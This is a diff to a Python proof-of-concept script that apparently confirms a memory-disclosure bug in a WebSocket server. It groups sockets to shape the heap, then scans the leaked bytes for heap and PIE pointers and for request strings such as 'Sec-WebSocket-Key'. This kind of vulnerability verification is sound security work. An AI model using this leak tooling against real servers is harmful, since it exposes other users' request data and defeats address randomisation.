@@ -54,15 +54,39 @@ def connect(port):
 
 
 def scan_pointers(buf):
-    """Report plausible 64-bit heap/PIE pointers in little-endian bytes."""
+    """Report plausible 64-bit heap/PIE pointers in little-endian bytes.
+
+    Heap bases observed on this host span 0x55.., 0x5c.., 0x5d.. and 0x5f..;
+    a 0x55-only window reported zero pointers on runs whose .bin held 64.
+    Scan 8-byte-aligned slots (the leaked window starts at data+16, so its
+    aligned pointer slots are aligned in the dump too) and require an
+    8-byte-aligned value.
+    """
     found = []
-    for i in range(0, len(buf) - 7):
+    for i in range(0, len(buf) - 7, 8):
         v = struct.unpack_from("<Q", buf, i)[0]
-        # glibc PIE heap 0x55.. / libc mmap 0x7f.. ; require aligned-ish low bits
-        if 0x0000550000000000 <= v <= 0x000056ffffffffff or \
+        if v % 8:
+            continue
+        if 0x0000500000000000 <= v <= 0x00006fffffffffff or \
            0x00007f0000000000 <= v <= 0x00007fffffffffff:
             found.append((i, v))
     return found
+
+
+def scan_strings(buf):
+    """Count WS-upgrade strings the report claims are visible in the leak."""
+    out = []
+    for needle in (b"127.0.0.1", b"Sec-WebSocket-Key", b"zzhZRbK+xOo="):
+        offs = []
+        start = 0
+        while True:
+            k = buf.find(needle, start)
+            if k < 0:
+                break
+            offs.append(k)
+            start = k + 1
+        out.append((needle.decode(), offs))
+    return out
 
 
 def main():
@@ -130,6 +154,8 @@ def main():
     print("plausible heap/PIE pointers:", len(ptrs))
     for off, v in ptrs[:40]:
         print(f"  +0x{off:x}: 0x{v:016x}")
+    for name, offs in scan_strings(data):
+        print(f"leaked string {name}: count={len(offs)} first={[hex(x) for x in offs[:4]]}")
 
     for s in holders + fillers + [spare, src]:
         s.close()
